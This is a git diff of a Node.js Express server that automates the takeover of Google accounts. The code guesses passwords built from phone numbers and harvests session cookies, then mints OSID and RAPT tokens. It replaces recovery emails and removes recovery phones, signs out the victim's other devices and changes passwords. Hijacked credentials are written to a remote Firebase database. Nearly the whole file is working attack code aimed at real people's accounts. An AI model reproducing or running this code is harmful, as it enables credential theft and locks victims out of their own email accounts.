@@ -1,36 +1,24 @@
 require('events').EventEmitter.prototype._maxListeners = 100
 const bodyParser = require('body-parser')
-const admin = require('firebase-admin')
 const express = require('express')
-const request = require('request')
+const { JSDOM } = require('jsdom')
 const crypto = require('crypto')
 const axios = require('axios')
-const http = require('http')
-const path = require('path')
 const fs = require('fs')
 
 
 const app = express()
 
-
 app.use(express.json())
 app.use(bodyParser.urlencoded({ extended: true }))
 
-const server = http.createServer(app)
-
-server.listen(process.env.PORT || 3000, ()=>{
+app.listen(process.env.PORT || 3000, ()=> {
     console.log("Listening on port 3000...")
 })
 
-const serviceAccount = require(path.resolve("database088-firebase-adminsdk-ho5ln-4610a9f3c6.json"))
+const COMPLETED = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/gmail/completed/'
+const UNKNOWN = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/gmail/unknown/'
 
-admin.initializeApp({
-    credential: admin.credential.cert(serviceAccount),
-    databaseURL: "https://database088-default-rtdb.firebaseio.com"
-})
-
-  
-const database = admin.database().ref('raiyan088')
 
 let mRecovery = null
 
@@ -44,190 +32,70 @@ app.post('/', async function (req, res) {
             let mData = req.body.data.split('★')
             console.log('Received Data: '+mData.length)
             if(mData.length == 6) {
-                passwordMatching(res, mData, null, 0, 0, mData[4])
-            } else if(mData.length == 8) {
-                getRaptToken(res, mData[6], mData, mData[7])
+                getOSIDtoken(res, mData)
             } else {
-                res.end('not 6')
+                res.end('ERROR')
             }
         } catch (e) {
             res.end(e.toString())
         }
     } else {
-        res.end('null')
+        res.end('NULL')
     }
 })
 
 app.get('/ip', async function (req, res) {
-    request({
-        url: 'https://ifconfig.me/ip',
-        method: 'GET',
-        followRedirect: false
-    }, function(error, response, body) {
-        if(error) {
-            res.end('Error')
-        } else {
-            res.end(body)
-        }
+    axios.get('https://ifconfig.me/ip').then(response => {
+        res.end(response.data)
+    }).catch(err => {
+        res.end('Error')
     })
 })
 
-function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
-    let pass = ''
-    if(mData[1].split('/')[1] == '880') {
-        pass = '0'+mData[2]
-    } else {
-        pass = mData[2]
-    }
-
-    let password = pass
-
-    if(again == 1) {
-        password = mData[6]
-    } else {
-        if(loop == 1) {
-            password = pass.substring(0, 8)
-        } else if(loop == 2) {
-            password = pass.substring(pass.length-8, pass.length)
+function serverError(connection, mData, wrong, type) {
+    try {
+        if(wrong && connection != null) {
+            setData(UNKNOWN+mData[0]+'.json', { type: type, data: JSON.stringify(mData) })
+            connection.end('ERROR')
         }
-    }
-
-    request({
-        url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[3]+'&_reqid=999999',
-        method: 'POST',
-        body: getPasswordData(password, parseInt(mData[5])),
-        headers: {
-            'Cookie': again == 1 ? '__Host-GAPS='+gps+'; '+sendCookies : '__Host-GAPS='+gps,
-            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
-            'google-accounts-xsrf' : 1
-        },
-        followRedirect: false
-    }, function(error, responce, body) {
-
-        let output = 0
-
-        console.log('Passwort Try: '+loop)
-
-        if(again == 0) {
-            try {
-                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
-                if(data[0][3] == 5) {
-                    if(mData[2].length > 8) {
-                        if(loop == 0) {
-                            output = 1
-                            passwordMatching(connection, mData, null, 0, 1, gps)
-                        } else if(loop == 1) {
-                            output = 1
-                            passwordMatching(connection, mData, null, 0, 2, gps)
-                        } else {
-                            console.log('Matching Failed')
-                        }
-                    }
-                } else if(data[0][3] == 1) {
-                    console.log('Login Success')
-                    let cookiesList = responce.headers['set-cookie']
-                    if(cookiesList) {
-                        output = 2
-                        let sendCookies = ''
-    
-                        for(let i=0; i<cookiesList.length; i++) {
-                            let singelData = cookiesList[i]
-                            try {
-                                let start = singelData.indexOf('=')
-                                let end = singelData.indexOf(';')
-                                let key = singelData.substring(0, start)
-                                if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
-                                    let value = singelData.substring(start+1, end)
-                                    sendCookies += key+'='+value+'; '
-                                }
-                            } catch (e) {}
-                        }
-
-                        getRaptToken(connection, password, mData, sendCookies)
-                    }
-                } else {
-                    let temp = mData[2].toString()
-                    let index = temp.length == 8 ? 2 : temp.length == 9 || temp.length == 10 ? 3 : temp.length == 11 ? 4 : 5
-                    console.log('Password Matching')
-                    if(data[0][3] == 2) {
-                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/1111111111/'+mData[2]).set(loop)
-                    } else {
-                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/'+temp.substring(0, index)+'/'+temp.substring(index, temp.length)).set(loop)
-                    }
-                }
-            } catch (e) {}
-        } else if(again == 1) {
-            output = 1
-            let wrong = true
-            console.log('Login Again')
-            try {
-                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
-                if(data[0][3] == 1) {
-                    let url = decodeURIComponent(data[0][13][2])
-                    let index = url.indexOf('rapt=')
-                    let split = url.substring(index+5, url.length).split('&')
-                    wrong = false
-
-                    Completed(connection, password, mData, sendCookies, split[0])
-                }
-            } catch (e) {}
-
-            try {
-                if(wrong && connection != null) {
-                    let send = sendCookies
-                    if(send == null) {
-                        send = {}
-                    }
-                    send['PASS'] = password
-                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                    connection.end(mData[0]+' 13')
-                }
-            } catch (e) {}
-        }
-
-        try {
-            if(output == 0 && connection != null) {
-                console.log('Next')
-                connection.end(mData[0]+' 1')
-            }
-        } catch (e) {}
-    })
+    } catch (e) {}
 }
 
+function getOSIDtoken(connection, mData) {
 
-function getRaptToken(connection, password, mData, sendCookies) {
+    let sendCookies = mData[5]
 
-    request({
-        url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info',
-        method: 'GET',
+    axios.get('https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info', {
+        maxRedirects: 0,
+        validateStatus: null,
         headers: {
             'Cookie': sendCookies,
             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        },
-        followRedirect: false
-    }, function(error, responce, body) {
+        }
+    }).then(response => {
         let wrong = true
         try {
-            if(!error && responce.headers['location']) {
-                let url = decodeURIComponent(responce.headers['location'])  
+            if(response.headers['location']) {
+                let url = decodeURIComponent(response.headers['location'])  
                 let index = url.indexOf('osidt=')
                 let split = url.substring(index+6, url.length).split('&')
                 let tempCookes = sendCookies
                 tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
                 wrong = false
-                request({
-                    url: 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0],
-                    method: 'GET',
+
+                axios.get('https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0], {
+                    maxRedirects: 0,
+                    validateStatus: null,
                     headers: {
                         'Cookie': tempCookes
-                    },
-                    followRedirect: false
-                }, function(error, responce, body) {
+                    }
+                }).then(response => {
                     let wrong = true
                     try {
-                        if(!error && responce.headers['set-cookie']) {
-                            cookiesList = responce.headers['set-cookie']
+                        let cookiesList = response.headers['set-cookie']
 
+                        if(cookiesList) {
+                            let osid = null
                             for(let i=0; i<cookiesList.length; i++) {
                                 let singelData = cookiesList[i]
                                 try {
@@ -235,528 +103,520 @@ function getRaptToken(connection, password, mData, sendCookies) {
                                     let end = singelData.indexOf(';')
                                     let key = singelData.substring(0, start)
                                     if(key == 'OSID') {
-                                        sendCookies += 'OSID='+singelData.substring(start+1, end)
+                                        osid = 'OSID='+singelData.substring(start+1, end)
                                         i = cookiesList.length
                                     }
                                 } catch (e) {}
                             }
-                            
-                            wrong = false
 
-                            request({
-                                url: 'https://myaccount.google.com/signinoptions/rescuephone',
-                                method: 'GET',
-                                headers: {
-                                    'Cookie': sendCookies,
-                                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                },
-                                followRedirect: false
-                            }, function(error, response, body) {
-                                let wrong = true
-                                try {
-                                    if (!error) {
-                                        let headers = response.headers
-                                        if(headers && headers['location']) {
-                                            let index = headers['location'].indexOf('rart=')
-                                            let split = headers['location'].substring(index, headers['location'].length).split('&')
-                                            wrong = false
-                                            request({
-                                                url: 'https://accounts.google.com/ServiceLogin?'+split[0],
-                                                method: 'GET',
-                                                headers: {
-                                                    'Cookie': sendCookies,
-                                                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                                },
-                                                followRedirect: false
-                                            }, function(error, response, body) {
-                                                let wrong = true
-                                                try {
-                                                    if (!error) {
-                                                        let headers = response.headers
-                                                        console.log(headers['location'])
-                                                         if(headers && headers['location']) {
-                                                            let url = headers['location']
-                                                            if(url.startsWith('https://accounts.google.com/ManageAccount') && url.includes('rapt=')) {
-                                                                let index = url.indexOf('rapt=')
-                                                                let rapt = url.substring(index+5, url.length)
-                                                                wrong = false
-                                            
-                                                                Completed(connection, password, mData, sendCookies, rapt)
-                                                            } else {
-                                                                let index = url.indexOf('TL=')
-                                                                let tl = url.substring(index+3, url.length).split('&')[0]
-                                                                index = url.indexOf('cid=')
-                                                                let cid = url.substring(index+4, url.length).split('&')[0]
-                                                                cookiesList = headers['set-cookie']
-                                                                let gps = mData[4]
-                                                                for(let i=0; i<cookiesList.length; i++) {
-                                                                    let singelData = cookiesList[i]
-                                                                    try {
-                                                                        let start = singelData.indexOf('=')
-                                                                        let end = singelData.indexOf(';')
-                                                                        let key = singelData.substring(0, start)
-                                                                        if(key == '__Host-GAPS') {
-                                                                            gps = singelData.substring(start+1, end)
-                                                                            i = cookiesList.length
-                                                                        }
-                                                                    } catch (e) {}
-                                                                }
-                                                                wrong = false
-                                                                mData[3] = tl
-                                                                mData[4] = gps
-                                                                mData[5] = cid
-                                                                mData[6] = password
-                                                                passwordMatching(connection, mData, sendCookies, 1, 0, gps)
-                                                            }
-                                                        }
-                                                    } else {}
-                                                } catch (e) {}
-                                                
-                                                try {
-                                                    if(wrong && connection != null) {
-                                                        let send = sendCookies
-                                                        if(send == null) {
-                                                            send = {}
-                                                        }
-                                                        send['PASS'] = password
-                                                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                        connection.end(mData[0]+' 2')
-                                                    }
-                                                } catch (e) {}
-                                            })
-                                        }
-                                    } else {}
-                                } catch (e) {}
-                                
-                                try {
-                                    if(wrong && connection != null) {
-                                        let send = sendCookies
-                                        if(send == null) {
-                                            send = {}
-                                        }
-                                        send['PASS'] = password
-                                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                        connection.end(mData[0]+' 3')
-                                    }
-                                } catch (e) {}
-                            })
-                        }
-                    } catch (e) {}
-
-                    try {
-                        if(wrong && connection != null) {
-                            let send = sendCookies
-                            if(send == null) {
-                                send = {}
+                            if (osid == null) {
+                                let index = cookiesList.indexOf('OSID=')
+                                if (index >= 0) {
+                                    let temp = cookiesList.substring(index, cookiesList.length)
+                                    osid = temp.substring(0, temp.indexOf(';')+1)
+                                } 
                             }
-                            send['PASS'] = password
-                            database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                            connection.end(mData[0]+' 5')
+
+                            if (osid) {
+                                wrong = false
+                                sendCookies += osid
+                                mData[5] = sendCookies
+
+                                getRAPTtoken(connection, mData)
+                            }
                         }
                     } catch (e) {}
+
+                    serverError(connection, mData, wrong, '4')
+                }).catch(err => {
+                    serverError(connection, mData, true, '3')
                 })
             }
         } catch (e) {}
 
+        serverError(connection, mData, wrong, '2')
+    }).catch(err => {
+        serverError(connection, mData, true, '1')
+    })
+}
+
+function getRAPTtoken(connection, mData) {
+    axios.get('https://myaccount.google.com/signinoptions/rescuephone', {
+        maxRedirects: 0,
+        validateStatus: null,
+        headers: {
+            'Cookie': mData[5],
+            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+        }
+    }).then(response => {
+        let wrong = true
         try {
-            if(wrong && connection != null) {
-                let send = sendCookies
-                if(send == null) {
-                    send = {}
+            let location = response.headers['location']
+            if(location) {
+                let index = location.indexOf('rart=')
+                let split = location.substring(index, location.length).split('&')
+                
+                wrong = false
+
+                axios.get('https://accounts.google.com/ServiceLogin?'+split[0], {
+                    maxRedirects: 0,
+                    validateStatus: null,
+                    headers: {
+                        'Cookie': mData[5],
+                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                    }
+                }).then(response => {
+                    let wrong = true
+                    try {
+                        let location = response.headers['location']
+                        if (location) {
+                            if(location.includes('rapt=')) {
+                                let index = location.indexOf('rapt=')
+                                mData[6] = location.substring(index+5, location.length).split('&')[0]
+                                wrong = false
+            
+                                languageChange(connection, mData)
+                            } else if(location.startsWith('https://accounts.google.com/InteractiveLogin') && location.includes('rart=')) {
+                                let index = location.indexOf('rart=')
+                                let rart = location.substring(index, location.length).split('&')[0]
+                                wrong = false
+
+                                axios.get('https://accounts.google.com/InteractiveLogin?'+rart, {
+                                    maxRedirects: 0,
+                                    validateStatus: null,
+                                    headers: {
+                                        'Cookie': mData[5],
+                                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                                    }
+                                }).then(response => {
+                                    try {
+                                        let location = response.headers['location']
+                                        if(location.includes('rapt=')) {
+                                            let index = location.indexOf('rapt=')
+                                            mData[6] = location.substring(index+5, location.length).split('&')[0]
+                                            
+                                            languageChange(connection, mData)
+                                        } else {
+                                            let index = location.indexOf('TL=')
+                                            let tl = location.substring(index+3, location.length).split('&')[0]
+                                            index = location.indexOf('cid=')
+                                            let cid = location.substring(index+4, location.length).split('&')[0]
+                                            let cookiesList = response.headers['set-cookie']
+                                            let gps = cookiesGPS(cookiesList, mData[4])
+                                            mData[2] = tl
+                                            mData[3] = cid
+                                            mData[4] = gps
+                                            passwordMatching(connection, mData)
+                                        }
+                                    } catch (error) {
+                                        serverError(connection, mData, true, '10')
+                                    }
+                                }).catch(err => {
+                                    serverError(connection, mData, true, '9')
+                                })
+                            } else {
+                                let index = location.indexOf('TL=')
+                                let tl = location.substring(index+3, location.length).split('&')[0]
+                                index = location.indexOf('cid=')
+                                let cid = location.substring(index+4, location.length).split('&')[0]
+                                let cookiesList = response.headers['set-cookie']
+                                let gps = cookiesGPS(cookiesList, mData[4])
+                                mData[2] = tl
+                                mData[3] = cid
+                                mData[4] = gps
+                                passwordMatching(connection, mData)
+                            }
+                        }
+                    } catch (e) {}
+                    
+                    serverError(connection, mData, wrong, '8')
+                }).catch(err => {
+                    serverError(connection, mData, true, '7')
+                })
+            }
+        } catch (e) {}
+        
+        serverError(connection, mData, wrong, '6')
+    }).catch(err => {
+        serverError(connection, mData, true, '5')
+    })
+}
+
+function passwordMatching(connection, mData) {
+    axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[2], getPasswordData(mData[1], parseInt(mData[3])), {
+        maxRedirects: 0,
+        validateStatus: null,
+        headers: {
+            'Cookie': '__Host-GAPS='+mData[4]+'; '+mData[5],
+            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf' : 1
+        }
+    }).then(response => {
+        let wrong = true
+
+        try {
+            let body = response.data
+            let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
+
+            if(data[0][3] == 1) {
+                let url = decodeURIComponent(data[0][13][2])
+                if(url.includes('rapt=')) {
+                    let index = url.indexOf('rapt=')
+                    mData[6] = url.substring(index+5, url.length).split('&')[0]
+                    wrong = false
+                    languageChange(connection, mData)
                 }
-                send['PASS'] = password
-                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                connection.end(mData[0]+' 4')
+            }
+        } catch (e) {}
+
+        serverError(connection, mData, wrong, '12')
+    }).catch(err => {
+        serverError(connection, mData, true, '11')
+    })
+}
+
+function languageChange(connection, mData) {
+    axios.get('https://myaccount.google.com/phone', {
+        maxRedirects: 0,
+        validateStatus: null,
+        headers: {
+            'Cookie': mData[5],
+            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+        }
+    }).then(response => {
+        try {
+            const dom = new JSDOM(response.data)
+
+            let list = dom.window.document.querySelectorAll('script')
+            let numbers = []
+            let gmail = null
+            let time = null
+            let years = []
+            let year = parseInt(new Date().getFullYear())
+
+            for (let i = 0; i < list.length; i++) {
+                let html = list[i].innerHTML
+                if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
+                    let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
+                    let data = data_list[0]
+                    for (let i = 0; i < data.length; i++) {
+                        years.push(data[i][18])
+                        let list = data[i][11][0][1]
+                        list.sort(function(a, b){return a - b})
+                        let out = list
+                        let map = {}
+                        if (list.length > 2) {
+                            let temp = {}
+                            out = []
+                            for (let j = 0; j < list.length; j++) {
+                                temp[list[j]] = 'x'
+                            }
+                            let hasNum = data_list[1]
+                            for (let j = 0; j < hasNum.length; j++) {
+                                if(temp[hasNum[j][0]] != null && hasNum[j][2] == true) {
+                                    out.push(hasNum[j][0])
+                                }
+                            }
+                        }
+                        out.sort(function(a, b){return a - b})
+                        if (out[0] == 1) {
+                            map['type'] = 'ZBoWob'
+                        } else {
+                            map['type'] = 'S8YvCb'    
+                        }
+                        map['number'] = data[i][0]
+                        map['token'] = JSON.stringify(out)
+                        numbers.push(map) 
+                    }
+                } else if (html.startsWith('window.WIZ_global_data')) {
+                    try {
+                        let temp = JSON.parse(html.substring(html.indexOf('{'), html.lastIndexOf('}')+1))
+                        if (temp['SNlM0e']) {
+                            time = temp['SNlM0e']
+                        }
+                        if (temp['oPEP7c']) {
+                            gmail = temp['oPEP7c']
+                        }
+                    } catch (e) {}
+                }
+            }
+
+            years.sort(function(a, b){return a-b})
+            if(years.length > 0) {
+                year = parseInt(new Date(years[0]).getFullYear())
+            }
+
+            let mGmail = gmail.replace('@gmail.com', '').replace('.', '')
+                        
+            let position = Math.floor((Math.random() * (mRecovery.length-1)))
+            let recovery = mRecovery[position]
+            
+            mData[7] = mGmail
+            mData[8] = recovery
+            mData[9] = numbers
+            mData[10] = time
+            mData[11] = year
+
+            axios.post('https://myaccount.google.com/_/language_update', getLanguage(time), {
+                maxRedirects: 0,
+                validateStatus: null,
+                headers: {
+                    'Cookie': mData[5],
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                }
+            }).then(response => {
+                recoveryChange(connection, mData)
+            }).catch(err => {
+                recoveryChange(connection, mData)
+            })
+        } catch (e) {
+            serverError(connection, mData, true, '14')
+        }
+    }).catch(err => {
+        serverError(connection, mData, true, '13')
+    })
+}
+
+function recoveryChange(connection, mData) {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[6], getRecoveryData(mData[8]+'@gmail.com', mData[10]), {
+        maxRedirects: 0,
+        validateStatus: null,
+        headers: {
+            'Cookie': mData[5],
+            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+        }
+    }).then(response => {
+        let wrong = true
+        try {
+            if(!response.data.includes('"er"')) {
+                wrong = false
+                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[6], getVerificationData(mData[10]), {
+                    maxRedirects: 0,
+                    validateStatus: null,
+                    headers: {
+                        'Cookie': mData[5],
+                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                    }
+                }).then(response => {
+                    deviceLogOut(connection, mData)
+                }).catch(err => {
+                    deviceLogOut(connection, mData)
+                })
+            }
+        } catch (e) {}
+
+        serverError(connection, mData, wrong, '16')
+    }).catch(err => {
+        serverError(connection, mData, true, '15')
+    })
+}
+
+function deviceLogOut(connection, mData) {
+
+    axios.get('https://myaccount.google.com/device-activity', {
+        maxRedirects: 0,
+        validateStatus: null,
+        headers: {
+            'Cookie': mData[5],
+            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+        }
+    }).then(response => {
+        try {
+            const dom = new JSDOM(response.data)
+
+            let list = dom.window.document.querySelectorAll('script')
+            let logout = {}
+            let data = []
+            let time = null
+
+            for (let i = 0; i < list.length; i++) {
+                let html = list[i].innerHTML
+                if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
+                    data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
+                } else if (html.startsWith('window.WIZ_global_data')) {
+                    try {
+                        let temp = JSON.parse(html.substring(html.indexOf('{'), html.lastIndexOf('}')+1))
+                        if (temp['SNlM0e']) {
+                            time = temp['SNlM0e']
+                        }
+                    } catch (e) {}
+                }
+            }
+
+            for(let i=0; i<data.length; i++) {
+                let child = data[i][2]
+                for(let j=0; j<child.length; j++) {
+                    let main = child[j]
+                    if(main.length > 23) {
+                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
+                            logout[main[0]] = main[13]
+                        }
+                    }
+                }
+            }
+
+            if (time == null) {
+                time = mData[10]
+            } else {
+                mData[10] = time
+            }
+
+            if(Object.keys(logout).length > 0) {
+                let size = 0
+                let output = 0
+        
+                for(let [key, value] of Object.entries(logout)) {
+                    size++
+                    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOut(value, time), {
+                        maxRedirects: 0,
+                        validateStatus: null,
+                        headers: {
+                            'Cookie': mData[5],
+                            'Content-Type' :'application/x-www-form-urlencoded;charset=UTF-8',
+                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                        }
+                    }).then(response => {
+                        output++
+                        if(output == size) {
+                            numberRemove(connection, mData)
+                        }
+                    }).catch(err => {
+                        output++
+                        if(output == size) {
+                            numberRemove(connection, mData)
+                        }
+                    })
+                }
+            } else {
+                numberRemove(connection, mData)
+            }
+        } catch (e) {
+            numberRemove(connection, mData)
+        }
+    }).catch(err => {
+        numberRemove(connection, mData)
+    })
+}
+
+function numberRemove(connection, mData) {
+    let size = 0
+    let output = 0
+    let numbers = mData[9]
+
+    if (numbers.length == 0) {
+        passwordChange(connection, mData)
+    } else {
+        for(let i=0; i<numbers.length; i++) {
+            size++
+            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[6], getPhoneData(numbers[i], mData[10]), {
+                maxRedirects: 0,
+                validateStatus: null,
+                headers: {
+                    'Cookie': mData[5],
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                }
+            }).then(response => {
+                output++
+                if(output == size) {
+                    passwordChange(connection, mData)
+                }
+            }).catch(err => {
+                output++
+                if(output == size) {
+                    passwordChange(connection, mData)
+                }
+            })
+        }
+    }
+}
+
+
+function passwordChange(connection, mData) {
+    let changePass = getRandomPassword()
+
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[6], getChangePasswordData(changePass, mData[10]), {
+        maxRedirects: 0,
+        validateStatus: null,
+        headers: {
+            'Cookie': mData[5],
+            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+        }
+    }).then(response => {
+        try {
+            if(response.data.includes('"er"')) {
+                changePass = mData[1]
+            }
+
+            let send = { create: mData[11], password: changePass, recovery: mData[8] }
+            console.log(send)
+
+            setData(COMPLETED+mData[7]+'.json', send)
+
+            if (connection) {
+                connection.end('SUCCESS')
+            }
+        } catch (e) {}
+        
+    }).catch(err => {
+        try {
+            changePass = mData[1]
+
+            let send = { create: mData[11], password: changePass, recovery: mData[8] }
+            console.log(send)
+            
+            setData(COMPLETED+mData[7]+'.json', send)
+
+            if (connection) {
+                connection.end('SUCCESS')
             }
         } catch (e) {}
     })
 }
 
-function Completed(connection, password, mData, sendCookies, mRAPT) {
 
-    request({
-        url: 'https://myaccount.google.com/phone',
-        method: 'GET',
+function setData(url, data) {
+    axios.put(url, JSON.stringify(data), {
         headers: {
-            'Cookie': sendCookies,
-            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+            'Content-Type': 'application/x-www-form-urlencoded'
         }
-    }, function(error, response, body) {
-        let wrong = true
+    }).then(res => {}).catch(err => {})
+}
+
+function updateData(url, data) {
+    axios.patch(url, JSON.stringify(data), {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }).then(res => {}).catch(err => {})
+}
+
+
+function cookiesGPS(cookiesList, tempGps) {
+    for(let i=0; i<cookiesList.length; i++) {
+        let singelData = cookiesList[i]
         try {
-            if(!error) {
-                let index = body.indexOf('SNlM0e')
-                if(index != -1) {
-                    let temp = body.substring(index+6, index+100)
-                    let time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
-                    wrong = false
-
-                    request({
-                        url: 'https://myaccount.google.com/_/language_update',
-                        method: 'POST',
-                        body: getLanguage(time),
-                        headers: {
-                            'Cookie': sendCookies,
-                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                        },
-                        followRedirect: false
-                    }, function(error, response, body) {
-
-                        request({
-                            url: 'https://myaccount.google.com/phone',
-                            method: 'GET',
-                            headers: {
-                                'Cookie': sendCookies,
-                                'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                            },
-                            followRedirect: false
-                        }, function(error, response, body) {
-                            let wrong = true
-                            try {
-                                if(!error) {
-                                    let index = body.indexOf('SNlM0e')
-                                    if(index != -1) {
-                                        let temp = body.substring(index+6, index+100)
-                                        let time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
-                                        index = body.indexOf('class="CEETff"')
-                                        let years = []
-                                        let year = '2022'
-                                        let html = body
-                                        for(let i=0; i<5; i++) {
-                                            index = html.indexOf('class="CEETff"')
-                                            if(index != -1) {
-                                                let temp = html.substring(index, index+150)
-                                                years.push(checkYear(temp))
-                                                html = html.substring(index+150, html.length)
-                                            } else {
-                                                i=5
-                                            }
-                                        }
-                                        years.sort(function(a, b){return a-b})
-                                        if(years.length > 0) {
-                                            year = years[0].toString()
-                                        }
-                                        index = body.indexOf('WIZ_global_data')
-                                        let gmail = null
-                                        if(index != -1) {
-                                            try {
-                                                let temp = body.substring(index, body.length)
-                                                let data = JSON.parse(temp.substring(temp.indexOf('{'), temp.indexOf(';</script>')))
-                                                gmail = data['oPEP7c']
-                                            } catch (e) {}
-                                        }
-                    
-                                        if(gmail == null) {
-                                            index = body.indexOf('@gmail.com')
-                                            if(index != -1) {
-                                                try {
-                                                    temp = body.substring(index-50, index)
-                                                    let last = body.substring(index+10, index+11)
-                                                    index = 0
-                                                    if(last == '"') {
-                                                        index = temp.lastIndexOf('"')
-                                                    } else if(last == '\'') {
-                                                        index = temp.lastIndexOf('\'')
-                                                    } else if(last == ')') {
-                                                        index = temp.lastIndexOf('(')
-                                                    } else if(last == '<') {
-                                                        index = temp.lastIndexOf('>')
-                                                    }
-                                                    gmail = temp.substring(index+1, temp.length)+'@gmail.com'
-                                                } catch (e) {}
-                                            }
-                                        }
-                    
-                                        let mGmail = gmail.replace('@gmail.com', '').replace('.', '')
-                                        
-                                        let position = Math.floor((Math.random() * (mRecovery.length-1)))
-                                        let recovery = mRecovery[position]
-                                        wrong = false
-                    
-                                        console.log(time, gmail)
-                    
-                                        request({
-                                            url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mRAPT,
-                                            method: 'POST',
